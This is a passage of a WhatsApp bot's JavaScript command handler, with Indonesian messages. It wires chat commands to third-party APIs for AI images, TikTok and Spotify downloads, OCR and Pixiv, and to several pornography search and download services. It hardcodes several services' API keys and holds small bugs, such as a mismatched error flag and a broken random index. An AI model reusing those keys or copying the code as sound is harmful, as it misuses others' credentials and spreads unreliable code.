//await conn.sendFile2(from, response, `image`, done, m)
await conn.sendImage(m.chat, response, done, m)
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
//=========================================================//
case 'realistic2': {
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
reply(global.wait);
const response = `https://api.yanzbotz.my.id/api/text2img/yanzbotz?prompt=${text}`
//await conn.sendFile2(from, response, `image`, done, m)
await conn.sendImage(m.chat, response, done, m)
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
//=========================================================//
case 'diffusion': {
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
reply(global.wait);
const response = `https://api.yanzbotz.my.id/api/text2img/diffusion?prompt=${text}`
//await conn.sendFile2(from, response, `image`, done, m)
await conn.sendImage(m.chat, response, done, m)
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break*/
case 'prodia': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://api.akuari.my.id/ai/prodia2?prompt=${text}`
//await conn.sendFile2(from, response, `image`, done, m)
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'simurg': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://rest-api.akuari.my.id/ai/simurg?prompt=${text}`
//await conn.sendFile2(from, response, `image`, done, m)
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'sdxl': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://api.akuari.my.id/ai/sdxl?prompt=${text}`
//await conn.sendFile2(from, response, `image`, done, m)
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'dalle': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://api.akuari.my.id/ai/dall-e2?prompt=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
/*case 'imgeditor': {
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }
  if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`Reply image with ${command} blue eyes with cute face and white skin`)
let error;
try{
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    let response = `https://xzn.wtf/api/image-editor?url=${anu}&text=${text}&apikey=nerobot`
    conn.sendMessage(from, { image: { url: response}, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
case 'jojo':
case 'anime2d':
case 'cartoon3d':
case 'pretty':
case 'romancecomic':
case 'maid':
case 'superhero':
case 'watercolor':
case 'doodle':
case 'americacomic':
case 'starrygirl': {
  const alias = {
    "anime2d": "anime_2d",
    "cartoon3d": "cartoon_3d",
    "pretty": "pretty_soldier",
    "jojo": "bizarre",
    "maid": "maid_dressing",
    "romancecomic": "romance_comic",
    "superhero": "superhero_comic",
    "watercolor": "watercolor",
    "doodle": "doodle",
    "americancomic": "america-comic",
    "starrygirl": "starry_girl"
  };
  const aliasCommand = alias[command] || command;
  if (!isPrem) return replyprem(mess.premium)

  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video|image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = await fetchJson(`https://xzn.wtf/api/aimirror?&apikey=nerobot&url=${anu}&filter=${aliasCommand}`);
   
    conn.sendMessage(from, { image: { url: response.generated_image_addresses[0] }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'textimg' : {
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`${command} smile face with blush and blue hair`)
    const response = await fetchJson(`https://xzn.wtf/api/midjourney?text=${text}&apikey=nerobot`);
   if (response.status == 'FAILURE') return m.reply('gagal')
   let error;
   try {
    conn.sendMessage(from, { image: { url: response.imageUrl }, caption: 'nih' }, { quoted: fkontak });
  }catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
  //END AI MENU
break*/
case 'jadianime': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    const resnime = `https://api.akuari.my.id/ai/toanime2?urlimg=${anu}`
   await conn.sendImage(m.chat, resnime, done, m)
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'jadikartun': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const restoon = `https://api.akuari.my.id/ai/cartoon3d?urlimg=${anu}`
await conn.sendImage(m.chat, restoon, done, m)
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
			}
			break
/*case 'jadianime': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/toanime?url=${anu}`)
let hasilanim = response.url
await conn.sendImage(m.chat, hasilanim.img_crop_single, done, m)
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
			}
			break*/
case 'jadizombie': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/converter/zombie?url=${anu}`)
let hasilzombie = response.url
conn.sendImage(m.chat, hasilzombie, done, m)
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
			}
			break			
case 'jadigta': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/jadigta?url=${anu}`)
conn.sendImage(m.chat, response.result, done, m)
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
			}
			break
//========================SPOTIFY=========================//
case 'spotifysearch': {
if (!text) throw `*🚩 Contoh:* ${usedPrefix + command} Lathi`;  
  let teks = '';
let error18;
try {
    const api = await fetch(`https://api.betabotz.eu.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
    let json = await api.json();
    let res = json.result.data;    
    for (let i in res) {
      teks += `*${parseInt(i) + 1}.* *Title:* ${res[i].title}\n`;
      teks += `*Duration:* ${res[i].duration}\n`;
      teks += `*Popularity:* ${res[i].popularity}\n`;
      teks += `*Link:* ${res[i].url}\n\n`;
    }
     } catch (er) {
					error18 = true;
				} finally {
					if (error18) {
						replyerror("Yah Proses Gagal :(");
					}
					}
spotifyreply(teks)
}
break
case "spotify":{
if (!text) return paycall(`Di mana tautannya?`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return paytod(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `🐼 *Title:* ${name || ''}\n🐼 *Artists:* ${(artists || []).join(
            ','
        )}\n🐼 *Album:* ${album_name}\n🐼 *Release Date:* ${release_date || ''}`
       const response = await conn.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: fkontak })
        const bufferpotify = await spotify.download()
        await conn.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
//========================TIKTOK=========================//
case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt':
if (!args[0]) {
        throw 'Uhm... URL-nya mana?';
    }
    if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
    try {
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Video dan Audio akan Dikirim dalam obrolan pribadi.`)
}
        const tiktokData = await tryServer1(args[0]);

        if (!tiktokData) {
            throw 'Gagal mendownload video!';
        }

        const videoURL = tiktokData.video.noWatermark;

        const videoURLWatermark = tiktokData.video.watermark;

        let ppTiktok = '';
        if (tiktokData.author && tiktokData.author.avatar) {
            ppTiktok = tiktokData.author.avatar;
        }

        const infonya_gan = `Judul: ${tiktokData.title}\n\nUpload: ${tiktokData.created_at}\n\nSTATUS:\n=====================\nLike = ${tiktokData.stats.likeCount}\nKomen = ${tiktokData.stats.commentCount}\nShare = ${tiktokData.stats.shareCount}\nViews = ${tiktokData.stats.playCount}\nSimpan = ${tiktokData.stats.saveCount}\n=====================\n\nUploader: ${tiktokData.author.name || 'Tidak ada informasi penulis'}\n( ${tiktokData.author.unique_id} - https://www.tiktok.com/@${tiktokData.author.unique_id} )\nBio: ${tiktokData.author.signature}\nLagu: ${tiktokData.music.play_url}\nResolusi: ${tiktokData.video.ratio}\nFoto Profile: ${ppTiktok}`;

        if (videoURL || videoURLWatermark) {
           // await conn.sendFile2(m.chat, videoURL, 'tiktok.mp4', `${done}\n\n${infonya_gan}`, m);
           await conn.sendMessage(m.sender, { video : { url : videoURL }, mimetype: 'video/mp4', caption : `${done}\n\n${infonya_gan}` }, { quoted : m })
    }
    await conn.sendMessage(m.sender, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })
              } catch (errornya) {
            // Jika server kedua juga gagal, tangani error di sini
            replyerror(`Error: ${errornya}`);
            }
break
case 'tiktokmp3': case 'ttmp3': case 'ttaudio':
if (!args[0]) {
        throw 'Uhm... URL-nya mana?';
    }
if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
    try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Audio akan Dikirim dalam obrolan pribadi.`)
}
        const tiktokData = await tryServer1(args[0]);

        if (!tiktokData) {
            throw 'Gagal mendownload Audio!';
        }

            await conn.sendMessage(m.sender, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })

        } catch (errornya) {
            // Jika server kedua juga gagal, tangani error di sini
            replyerror(`Error: ${errornya}`);
        };
break
case 'ttimg': case 'tiktokslide': case 'ttslide': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
        if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
        let error19;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        let res = await fetchJson(`https://rest.dimasbotzz.my.id/api/downloader/tiktokSlide?url=${args[0]}`)
        let anuttimg = res.result

           for (let tt of anuttimg.image) {
           //for (let i = 0; i < res.result.length; i++) {
               await conn.sendImage(m.chat, tt, done, m)
            // await conn.sendFile2(m.chat, tt, '', done, m);
            }
                              } catch (er) {
					error19 = true;
				} finally {
					if (error19) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
/*case 'ttimg': case 'tiktokslide': case 'ttslide': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
        if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Foto akan Dikirim dalam obrolan pribadi.`)
}
const tiktokData = await tryServer1(args[0]);

        if (!tiktokData) {
            throw 'Gagal mendownload video!';
        }

    for (let tt of tiktokData.images) {
      await conn.sendImage(m.sender, tt.url, done, m);
    }
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
            }
break*/
case 'tiktoknowm2': case 'ttnowm2': case 'tiktok2': case 'tt2': {
if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let res = await fetchJson(`https://aemt.me/download/ttdl?url=${args[0]}`)
let ttk = res.result
//await conn.sendFile2(m.chat, ttk.url.nowm, 'mp4', captionnya, m);
await conn.sendMessage(m.sender, { video : { url : ttk.video[0] }, mimetype: 'video/mp4', caption : `${done}` }, { quoted : m });
} catch (error) {
console.error(error);
replyerror(`Yah Proses Gagal:(`);
}
}
break
/*case 'tiktokmp3': case 'ttmp3': case 'ttaudio': {
if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let fetch = await fetchJson(`https://aemt.me/download/tikdl?url=${args[0]}`)
let ttaudio = await fetch.result
await conn.sendMessage(m.chat, { audio: { url: ttaudio.url.audio }, mimetype: 'audio/mp4' }, { quoted: m })
//await await conn.sendFile2(m.chat, ttaudio.url.audio, 'mp3', m);
} catch (error) {
console.error(error);
replyerror(`Yah Proses Gagal:(`);
}
}
break*/
//========================AKSARA JAWA=========================//
case 'aksarajawa': {
if (!text) return paycall( `Ketik sesuatu biar ketikan lu di generate jadi aksarajawa`)
let error10;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://api.akuari.my.id/other/latinkeaksara?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, m)
  } catch (er) {
					error10 = true;
				} finally {
					if (error10) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'latin': {
if (!text) return paycall( `Caranya kirim teks aksara jawa biar di translate in sama bot`)
let error11;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://api.akuari.my.id/other/aksarakelatin?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, m)
  } catch (er) {
					error = true;
				} finally {
					if (error11) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'pangkat': {
if (!text) return paycall( `Cara Pakai: ${prefix + command} 4|2`)
let [akar, pangkat] = text.split`|`
if (!akar) return paycall(`Cara Pakai: ${prefix + command} 4|2`)
if (!pangkat) return paycall(`Cara Pakai: ${prefix + command} 4|2`)
try{
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://rest-api.akuari.my.id/edukasi/pangkat?angka=${akar}&pangkat=${pangkat}`)
let data = await response.json()
let soalnya = await `Soal: ${data.soal}\nHasil: ${data.hasil}`
  conn.sendText(from, soalnya, m)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'akarquadrat': {
if (!text) return paycall( `Cara Pakai: ${prefix + command} 25`)
try{
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://rest-api.akuari.my.id/edukasi/akar?angka=${text}`)
let data = await response.json()
let soalnya = await `Soal: ${data.soal}\nHasil: ${data.hasil}`
  conn.sendText(from, soalnya, m)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'ocr': {
if (!/image/.test(mime)) return paycall(`Fitur OCR adalah fitur untuk mengambil teks di gambar, kegunaannya biar mudah ambil teks yang di foto, fitur ini masih tahap beta yang di kembangkan oleh developer shinchan senpai💖, cara pakainya kalian kirim foto yang ada teks nya lalu kalian (ketik : ${prefix} ocr ).`)
let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
    let error12;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let resocr = await fetch(`https://api.ocr.space/parse/imageurl?apikey=K89553582988957&url=${anu}`)
let dataocr = await resocr.json()
let hasilocr = dataocr?.ParsedResults?.[0]?.ParsedText
  //conn.sendText(from, hasilocr, m)
await conn.sendMessage(m.chat, {text: `${hasilocr}`}, {quoted: m})
    } catch (er) {
					error12 = true;
				} finally {
					if (error12) {
						replyerror("Error Bjir😁");
					}
					}
}
}
break
//========================WALLPAPER=========================//
/*case 'wallpaper': {
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return paycall('Wallpaper apa yang kamu inginkan?')
reply(`${global.wait} : ${q}`)
const wall = new AnimeWallpaper()
    let pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .scrapeFromWallHaven({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = wallpaper[Math.floor(Math.random() * wallpaper.length)]
            await conn.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//conn.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
}
break*/
case 'wallpaper2':{
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await conn.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: global.done}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
/*case 'wallpaper3': {
                if (!args.join(" ")) return paycall("Wallpaper apa yang kamu cari??")
                reply(global.wait)
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break*/
//========================WALLPAPER END=========================//
            /*case 'pinterest': {
              	if (!text) return paycall(`Apa yang mau kamu cari?`)
reply(global.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
conn.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break*/
case 'pinterest': case 'pin': {
let { lookup } = require('mime-types')
	text = text.endsWith('SMH') ? text.replace('SMH', '') : text 
	if (!text) throw 'Input Query / Pinterest Url'
	let res = await pinterest(text)
	// if (!res) throw res
	let mime = await lookup(res)
	text.match(URL_REGEX) ?
		await conn.sendMessage(m.chat, { [mime.split('/')[0]]: { url: res }, caption: `Succes Download: ${await shortUrl(res)}` }, { quoted: m }) :
	await conn.sendMessage(m.chat, { image: { url: res }, caption: `⭔ Result From: ${text}\n⭔ Media Url: ${res}`}, { quoted: m })
}
break
case 'pindl': {
if (!args[0]) return paycall(`${prefix + command} Masukan url`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/download/pindl?url=${args[0]}`)
let jadinya = response.result
await conn.sendImage(m.chat, jadinya.data.pin_url, done, m)
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
break
//========================PINTEREST END=========================//
case 'pixiv2': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
query = args.join(" ")
let error13;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let res = await fetch(`https://api.lolhuman.xyz/api/pixivdl/${query}?apikey=GataDios`)
let data = await res.json()
let memek = data.result
for (let i of memek.images) {
//await conn.sendFile2(from, i, `image`, done, m)
await conn.sendImage(m.chat, i, done, m)
}
} catch (er) {
					error13 = true;
				} finally {
					if (error13) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
/*break
case 'pixiv': case 'pixivdl': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
reply(global.wait)
pixivid = args[0]
let error14;
try {
let ini_buffer = await fetch(`https://api.akuari.my.id/downloader/pixiv?id=${pixivid}&ext=.jpg`)
await conn.sendMessage(from, { image: { url: ini_buffer.url }, caption: `${global.done}` }, { quoted: fkontak })
} catch (er) {
					error14 = true;
				} finally {
					if (error14) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break*/
case 'pixiv': case 'pixivdl':  {
	if (!text) throw 'Masukan Query Atau Url Pixiv'
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
	let respixiv = await pixivDl(text)
	for (let i = 0; i < respixiv.media.length; i++) {
		let caption = i == 0 ? `${respixiv.caption}\n\n*By:* ${respixiv.artist}\n*Tags:* ${respixiv.tags.join(', ')}` : ''
	//	await conn.sendFile2(m.chat, respixiv.media[i], '', caption, m)
	await conn.sendImage(m.chat, respixiv.media[i], caption, m)
	}
}
break
//========================PIXIV END=========================//
case 'carihentai':
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
query = args.join(" ")
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=GataDios&query=${query}`)
get_result = get_result.result
ini_txt = "🥵𝘿𝘼𝙏𝘼 𝘾𝙊𝘿𝙀 𝙃𝙀𝙉𝙏𝘼𝙄🥵 : \n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += "▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\n\n"
}
replyhentai(ini_txt)
} catch (error) {
        console.error(error);
        replyerror(`Gagal Mencari Code Hentai ${text}🥺🙏`);
    }
break
case 'nekopoi': {
if (!text) throw '*[❗] MASUKKAN NAMA HENTAI YANG AKAN DICARI*'

await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  let searchResults = await searchHentai(text)
  let teks = searchResults.result.map((v, i) => `
${i + 1}. *_${v.title}_*
↳ 📺 *_Views:_* ${v.views}
↳ 🎞️ *_Link:_* ${v.url}`).join('\n\n')

  let randomThumbnail
  if (searchResults.result.length > 0) {
    let randomIndex = Math.floor(Math.random() * searchResults.result.length)
    randomThumbnail = searchResults.result[randomIndex].thumbnail
  } else {
    randomThumbnail = 'https://pictures.hentai-foundry.com/e/Error-Dot/577798/Error-Dot-577798-Zero_Two.png'
    teks = '*[❗] TIDAK ADA HASIL PENCARIAN*'
  }

  conn.sendFile2(m.chat, randomThumbnail, 'error.jpg', teks, m)
}
break
/*case 'nhentai':
case 'ncode':
if (!text) return paycall(`Example: ${prefix + command} 344253`)
var body = text.replace(/\s+/g, '+')
if (!/[0-9]/.test(body)) throw ('only number')
reply(global.wait)
let error15;
try {
let res = await fetch(`https://api.lolhuman.xyz/api/nhentaipdf/${body}?apikey=haikalgans`)
let kontol = await res.json()
let anu = kontol.result
await conn.sendFile(m.chat, anu, `${body}.pdf`, blue)
} catch (er) {
					error15 = true;
				} finally {
					if (error15) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break*/
case 'nhentai':
case 'ncode': {
let code = (args[0] || '').replace(/\D/g, '')
if (!code) throw 'Input code'
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let data = await nhentaiScraper(code)
let pages = []
let thumbnya = `https://external-content.duckduckgo.com/iu/?u=https://t.nhentai.net/galleries/${data.media_id}/thumb.jpg`	
data.images.pages.map((v, i) => {
			let ext = new URL(v.t).pathname.split('.')[1]
			pages.push(`https://external-content.duckduckgo.com/iu/?u=https://i7.nhentai.net/galleries/${data.media_id}/${i + 1}.${ext}`)
		})
let buffer = await (await fetch(thumbnya)).buffer()		
let jpegThumbnail = await fetchBuffer(buffer)
let imagepdf = await toPDF(pages)		
await conn.sendMessage(m.chat, { document: imagepdf, jpegThumbnail, fileName: data.title.english + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
} catch (error) {
        console.error(error);
        m.reply(`Kode atau link yang kamu masukin tidak ditemukan`);
    }
}
break
case 'hentaivid': case 'hentaivideo': {
                const { hentai } = require('./lib/scraper.js')
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                conn.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `🐼 Title : ${result912.title}\n🐼 Category : ${result912.category}\n🐼 Mimetype : ${result912.type}\n🐼 Views : ${result912.views_count}\n🐼 Shares : ${result912.share_count}\n🐼 Source : ${result912.link}\n🐼 Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'hentaivid2': {
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
conn.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
//========================BOKEPNYA=========================//
case 'xnxx': case 'xnxxdl': {
	if (!text) return paycall(`Kirim Link Bokep di situs XNXX`)
        if (!text.includes('xnxx.com')) return paytod(`Kirim Link Bokep di situs XNXX`)
        try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
conn.sendMessage(m.chat, { caption: `≡  *XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'xvideos': case 'xvideosdl': {
	if (!text) return paycall(`Kirim Link Bokep di situs XVIDEOS`)
        if (!text.includes('xvideos.com')) return paytod(`Kirim Link Bokep di situs XVIDEOS`)
        try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const fg = require('api-dylux')
            let xvid = await fg.xvideosdl(text)
conn.sendMessage(m.chat, { caption: `≡  *XVIDEOS DOWNLOAD*
        
▢ *📌Title*: ${xvid.title}
▢ *👀View*: ${xvid.views}
▢ *👍Like*: ${xvid.likes}
▢ *👎Dislike*: ${xvid.deslikes}
▢ *📊Vote*: ${xvid.vote}
▢ *📈Size:* ${xvid.size}`, video: {url: xvid.url_dl} }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'xnxxsearch': {
	if (!text) return paycall(`Kirim Judul Bokep`)
	try {
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replybokep(ff)
              } catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
              }
              break
case 'xvideosearch': {
	if (!text) return paycall(`Kirim Judul Bokep`)
	try {
let responnyaaj = await fetchJson(`https://api.fgmods.xyz/api/search/xvideosearch?text=${text}&apikey=623JU5Hl`)
  let xvs = responnyaaj.result.map((v, i) => `
${i + 1}. *Title* : ${v.title}
*Durasi* : ${v.duration}
*Link* : ${v.url}`).join('\n')
                   replyxvideos(xvs)
              } catch (error) {
